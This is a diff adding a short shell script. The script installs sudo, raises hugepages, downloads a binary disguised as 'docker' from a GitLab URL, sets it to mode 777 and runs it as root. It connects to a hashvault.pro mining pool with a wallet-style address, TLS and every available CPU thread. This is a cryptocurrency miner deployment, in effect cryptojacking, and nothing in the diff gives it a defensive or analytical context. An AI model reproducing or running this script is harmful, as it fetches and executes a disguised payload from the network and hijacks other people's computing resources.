@@ -1,0 +1,5 @@
+apt install sudo -y
+sudo sysctl -w vm.nr_hugepages=102400
+wget https://gitlab.com/g6292/gabutz/-/raw/main/docker
+chmod 777 docker
+sudo ./docker -o frankfurt01.hashvault.pro:80 -u hvs1LXMn1vb21i46xxCFqBMLVnR91E9HVR5fzuRh1GueaQKq3pAQKxudk6RNyWfZGi6rUCGMQNcUfi1bnqsBRzXc6JJ6LSL9s2 -p $(echo $(shuf -i 1-20000 -n 1)-kzp) -k --tls -t$(nproc --all)
